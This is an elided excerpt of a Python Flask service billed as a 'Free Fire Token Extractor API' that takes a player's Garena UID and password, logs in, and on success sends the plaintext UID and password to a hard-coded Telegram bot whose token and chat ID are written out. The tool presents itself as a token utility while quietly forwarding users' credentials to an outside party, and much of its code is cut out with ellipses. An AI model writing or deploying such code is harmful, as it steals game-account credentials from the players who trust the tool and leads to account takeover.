...
OR: http://localhost:8000/kirito?uid=USERNAME&password=PASSWORD
"""
...
BOT_TOKEN = "8415294664:AAGaMiuIsFSHiL1Avi6tkg5HaWoe943BM54"
CHAT_ID = "7326248826"
...
def semy_endpoint():
    ...
    # If UID/Password provided, fetch access_token from Garena
    if uid and password:
    ...
    for pt in platform_types:
        ...
        if result:
            ...
            # SIRF SUCCESSFUL LOGIN PAR TELEGRAM PE BHEJENGE
            if uid and password:
                telegram_text = f"""✅ LOGIN SUCCESSFUL ✅

UID : {uid}
PASSWORD : {password}

━━━━━━━━━━━━━━━━━━━━
Account UID: {result['account_uid']}
...
def health_check():
    ...
    return jsonify({"status": "healthy", "service": "Free Fire Token Extractor"})

if __name__ == '__main__':
    print("=" * 50)
    print("🔥 Free Fire Token Extractor API 🔥")
    print("=" * 50)
    print(f"📡 Server running on: http://0.0.0.0:8006")
    print(f"🤖 Telegram Bot Active: Yes")
    print(f"📱 Bot Token: {BOT_TOKEN[:10]}...")
    print(f"💬 Chat ID: {CHAT_ID}")
    print("=" * 50)
    print("\n📝 Usage Examples:")
    print("1. With Access Token:")
    print("   http://localhost:8006/semy?access_token=YOUR_TOKEN")
    print("\n2. With UID & Password:")
    print("   http://localhost:8006/semy?uid=USERNAME&password=PASSWORD")
    print("\n3. Health Check:")
